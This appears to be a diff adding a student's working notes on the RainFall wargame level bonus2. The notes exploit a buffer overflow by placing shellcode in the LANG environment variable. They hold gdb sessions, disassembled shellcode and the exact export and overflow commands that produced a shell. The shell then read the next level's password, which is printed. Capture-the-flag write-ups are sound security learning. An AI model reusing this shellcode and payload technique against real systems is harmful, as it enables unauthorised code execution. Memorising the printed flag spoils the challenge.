@@ -60,3 +60,122 @@ the only difference between the 2 payloads will be the position where we will wr
 18th for fi
 
 mmm... same issue as bonus0 (we have our payload that works in gdb, but not in situ)
+
+after testing all the buffers we have access of and re-reading our main.c again, there is one thing surprising:
+only the first 2 bytes of the LANG environment variable are used to determine the language, the rest of the variable is untouched
+
+lang is there:
+0x080485ab <+130>:   mov    %eax,0x9c(%esp)
+b *0x080485ab
+info register eax -> 0xbfffff31
+x/s 0xbfffff31 -> "fi"
+i r:
+eax            0xbfffff31       -1073742031
+ecx            0x804873a        134514490
+edx            0xbfffff2e       -1073742034
+ebx            0xbffff6c0       -1073744192
+esp            0xbffff670       0xbffff670
+ebp            0xbffff728       0xbffff728
+
+let's try exporting a 'big tm' lang variable
+
+set env LANG="fi <here is our payload>"
+r test test
+i r eax -> 0xbfffff19 (changed position, maybe it depends on the size of LANG)
+x/s 0xbfffff19
+0xbfffff19:      "\"fi <here is our payload>\""
+let's try with different size to make sure
+
+fi3 -> 0xbfffff30
+fi34 -> 0xbfffff2f
+fi345 -> 0xbfffff2e
+<empty> -> 0xbfffff33
+
+ok, it is dependent on the size of the env variable
+(it starts at 0xbfffff33 and decrement by the size of the var)
+
+last test:
+export LANG=$(echo "fi test") -> fi test
+export LANG=fi$(echo test) -> fitest
+perfect, we can do this
+
+mmm... same result, works in gdb but not outside... the payload is at fault then?
+
+after searching why gdb works but not normal exec, I found this: https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it
+and indeed when I run with env - LANG=fi$(cat /tmp/payload_b2) ./bonus2 0123456789012345678901234567890123456789 $(cat /tmp/payload_fi) i don't segfault and get the same behavior as gdb
+(if gdb is started with env - LANG=fi$(cat /tmp/payload_b2) gdb bonus2, and then you remove all the env variables from gdb), but I no longer have an interactive shell, so back to the payload we go
+
+finally, we have a segfault in gdb with a script that used to work in gdb!
+eax after getenv -> 0xbfffffaf
+
+x/8i 0xbfffffaf+2
+   0xbfffffb1:  push   $0xbfffff2c <- invalid position of /bin/sh, should be 0xbfffffc5 (is invalid since the offset to LANG in env is different)
+   0xbfffffb6:  mov    $0xb7e6b05f,%eax
+   0xbfffffbb:  inc    %eax
+   0xbfffffbc:  call   *%eax
+   0xbfffffbe:  xor    %eax,%eax
+   0xbfffffc0:  inc    %eax
+   0xbfffffc1:  xor    %ebx,%ebx
+   0xbfffffc3:  int    $0x80
+
+set env LANG=
+r test test
+i r eax -> 0xbfffffcc
+
+still having issues, so I will bite the bullet and use python instead of C + scp (faster to test a bunch of things)
+I also made a simple c file to copy in tmp to request the current env address of a named env variable
+
+export LANG=$(python -c "print 'fi' + '\x68\x31\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80' + '/bin/sh'")
+./bonus2 0123456789012345678901234567890123456789 $(python -c "print('B' * 18 + '\x1d\xff\xff\xbf' + 'B' * (32 - 4 - 18))")
+fail
+/tmp/getenv LANG
+0xbfffff1e
+asm -> 0xbfffff20
+/bin/sh -> 0xbfffff34
+
+export LANG=$(python -c "print 'fi' + '\x68\x34\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80' + '/bin/sh'")
+./bonus2 0123456789012345678901234567890123456789 $(python -c "print('B' * 18 + '\x20\xff\xff\xbf' + 'B' * (32 - 4 - 18))")
+returns without error (no prompt)
+
+export LANG=$(python -c "print 'fi' + '\x68\x34\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80' + '/bin/sh -i'")
+(new version of env)
+/tmp/env get LANG 2 22
+0xbfffff1b 0xbfffff1d 0xbfffff31
+
+export LANG=$(python -c "print 'fi' + '\x68\x31\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80' + '/bin/sh -i'")
+./bonus2 0123456789012345678901234567890123456789 $(python -c "print('B' * 18 + '\x1d\xff\xff\xbf' + 'B' * (32 - 4 - 18))")
+fail
+
+gdb
+file /tmp/env
+r get LANG 2 22
+0xbfffff38 0xbfffff3a 0xbfffff4e
+
+after python gdb.execute("set env LANG=...")
+0xbfffff23 0xbfffff25 0xbfffff39
+
+python gdb.execute("set env LANG=fi\x68\x39\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80/bin/sh -i")
+
+file bonus2
+r 0123456789012345678901234567890123456789 $(python -c "print('B' * 18 + '\x25\xff\xff\xbf' + 'B' * (32 - 4 - 18))")
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbfffff2a in ?? ()
+
+LANG->0xbfffff13
+
+python gdb.execute("set env LANG=fi\x68\x29\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80/bin/sh -i")
+r 0123456789012345678901234567890123456789 $(python -c "print('B' * 18 + '\x15\xff\xff\xbf' + 'B' * (32 - 4 - 18))")
+
+got into a subshell, but without right (since it's gdb)
+
+bonus2@RainFall:~$ /tmp/env get LANG
+"fih#_@1@1̀/bin/sh -i"
+0xbfffff21
+bonus2@RainFall:~$ export LANG=$(python -c "print 'fi\x68\x37\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80/bin/sh -i'")
+bonus2@RainFall:~$ ./bonus2 0123456789012345678901234567890123456789 $(python -c "print('B' * 18 + '\x23\xff\xff\xbf' + 'B' * (32 - 4 - 18))")
+Hyvää päivää 0123456789012345678901234567890123456789BBBBBBBBBBBBBBBBBB#BBBBBBBBBB
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+FINALLY!
